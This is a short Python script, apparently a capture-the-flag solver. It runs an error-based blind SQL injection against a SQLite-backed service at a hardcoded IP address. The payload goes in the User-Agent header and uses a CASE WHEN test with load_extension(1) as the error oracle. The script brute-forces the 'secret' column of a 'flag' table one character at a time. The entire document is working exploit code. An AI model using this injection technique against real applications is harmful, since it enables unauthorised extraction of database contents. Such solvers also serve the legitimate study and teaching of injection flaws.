import requests
import urllib.parse

url = "http://3.1.24.163:31134"
i = 1  
flag = ""

while i < 1000:
    for j in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*(){}_+-=\t":
        payload = "',null,null,null, CASE WHEN (SELECT hex(substr(secret," +str(i)+",1)) FROM flag) = hex('"+j+"') THEN NULL ELSE load_extension(1) END),(null,'"
        
        headers = {"User-Agent": payload}
        r = requests.get(url, headers=headers)
        
        if r.text == "Logged":
            flag += j
            if j == "\t": continue
            print("Flag is", flag)
            i += 1

print(flag)
